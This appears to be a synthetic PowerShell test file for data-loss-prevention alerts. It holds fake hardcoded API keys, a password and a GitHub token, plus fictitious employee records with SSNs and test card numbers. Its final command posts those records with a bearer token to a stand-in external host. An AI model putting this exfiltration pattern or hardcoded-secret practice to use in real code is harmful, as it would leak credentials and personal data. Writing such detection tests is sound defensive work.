# DLP TESTING ONLY — ALL DATA IS SYNTHETIC AND FICTITIOUS
# Source code alert test: PowerShell with embedded PII and credentials.

# Hardcoded secrets — should trigger source code + secrets detection
$ApiKey     = "AKIAIOSFODNN7EXAMPLE"
$ApiSecret  = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
$DbPassword = "Pr0d!P@ssw0rd_Fake_2024"
$GitHubPAT  = "ghp_xK9mT2rLqP8nW4vYbJcD6sEuFzAoI3gH5j"

# Fake employee PII records
$EmployeeRecords = @(
    [PSCustomObject]@{ Name="John Testington";   SSN="123-45-6789"; DOB="1980-03-14"; Salary=95000;  Card="4111111111111111" },
    [PSCustomObject]@{ Name="Jane Samplesworth"; SSN="234-56-7890"; DOB="1975-07-22"; Salary=112000; Card="5500005555555559" },
    [PSCustomObject]@{ Name="Robert Mockerson";  SSN="345-67-8901"; DOB="1990-11-05"; Salary=87500;  Card="378282246310005"  },
    [PSCustomObject]@{ Name="Emily Placeholder"; SSN="456-78-9012"; DOB="1988-01-30"; Salary=103000; Card="6011111111111117" }
)

# Export to CSV
$EmployeeRecords | Export-Csv -Path "employee_export.csv" -NoTypeInformation

# POST to external endpoint with auth header
$Headers = @{ Authorization = "Bearer $GitHubPAT" }
$Body    = $EmployeeRecords | ConvertTo-Json
Invoke-RestMethod -Uri "https://api.github.fake/upload" -Method Post -Headers $Headers -Body $Body

# DLP retest all-files marker 2026-06-24T161025
